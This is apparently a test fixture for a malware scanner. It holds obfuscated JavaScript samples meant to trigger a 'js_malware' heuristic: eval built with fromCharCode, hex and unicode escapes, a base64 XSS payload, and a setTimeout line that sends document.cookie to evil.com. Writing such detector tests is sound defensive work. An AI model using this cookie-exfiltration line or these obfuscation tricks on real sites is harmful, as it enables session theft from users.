// TEST FILE: Obfuscated JavaScript
// This should trigger: js_malware, heuristic detector

// fromCharCode obfuscation
var x = String.fromCharCode(101,118,97,108);
eval(x + '(document.cookie)');

// Hex escape sequences
var code = "\x65\x76\x61\x6c";
window[code]("alert(1)");

// Unicode escape sequences
var func = "\u0065\u0076\u0061\u006c";

// Base64 in script
var payload = atob("YWxlcnQoJ1hTUycp");
eval(payload);

// setTimeout with string (dangerous)
setTimeout("document.location='http://evil.com?c='+document.cookie", 1000);
